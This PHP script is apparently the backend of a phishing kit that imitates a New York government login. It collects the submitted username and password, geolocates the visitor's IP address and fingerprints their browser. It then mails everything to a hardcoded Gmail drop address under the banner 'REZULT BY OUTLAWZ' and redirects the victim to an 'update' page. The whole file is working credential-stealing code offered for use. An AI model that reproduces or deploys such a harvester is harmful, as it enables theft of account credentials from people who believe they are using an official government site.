<?php
$ipalt = $_REQUEST['REMOTE_ADDR']; // the IP address to query
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ipalt));
if($query && $query['status'] == 'success') {
$query['country'].', '.$query['city'].'!';
}
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CN = $praga->geoplugin_countryCode ; 
$ST = $praga->geoplugin_regionCode ;
function getBrowser() 
{ 
    $u_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }

    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Internet Explorer'; 
        $ub = "MSIE"; 
    } 
    elseif(preg_match('/Trident/i',$u_agent)) 
    { // this condition is for IE11
        $bname = 'Internet Explorer'; 
        $ub = "rv"; 
    } 
    elseif(preg_match('/Firefox/i',$u_agent)) 
    { 
        $bname = 'Mozilla Firefox'; 
        $ub = "Firefox"; 
    } 
    elseif(preg_match('/Chrome/i',$u_agent)) 
    { 
        $bname = 'Google Chrome'; 
        $ub = "Chrome"; 
    } 
    elseif(preg_match('/Safari/i',$u_agent)) 
    { 
        $bname = 'Apple Safari'; 
        $ub = "Safari"; 
    } 
    elseif(preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Opera'; 
        $ub = "Opera"; 
    } 
    elseif(preg_match('/Netscape/i',$u_agent)) 
    { 
        $bname = 'Netscape'; 
        $ub = "Netscape"; 
    } 
    
    // finally get the correct version number
    // Added "|:"
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
     ')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }

    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }

    // check if we have a number
    if ($version==null || $version=="") {$version="?";}

    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
} 

// now try it
$ua=getBrowser();
$yourbrowser= "" . $ua['name'] . " " . $ua['version'] . " on " .$ua['platform'] . " reports: <br >" . $ua['userAgent'];


$bilsmg .= ">>>>>NY GOV  LOGS 
REZULT BY OUTLAWZ<<<<<<<<\n";

$bilsmg .= ">>>>NY GOV INFO LOGS REZULT BY OUTLAWZ<<<<<<<<\n";

$bilsmg .= "USERNAME: ".$_POST['username']."\n";
$bilsmg .= "PASSWORD: ".$_POST['password']."\n";





$bilsmg .= ">>>>>NY GOV  LOGS REZULT BY OUTLAWZ<<<<<<<<\n";
$bilsmg .= "Fr0m $ip             chek in http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "USER AGENT $yourbrowser \n";


$bilsnd = "speedwap4@gmail.com";
$bilsub = ">>>>>NY GOV INFO LOGS REZULT BY OUTLAWZ<<<<<<<< | $CN | $ST | $ip";
$bilhead .= "MIME-Version: 2.0\n";
$arr=array($bilsnd);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: update.html");
?>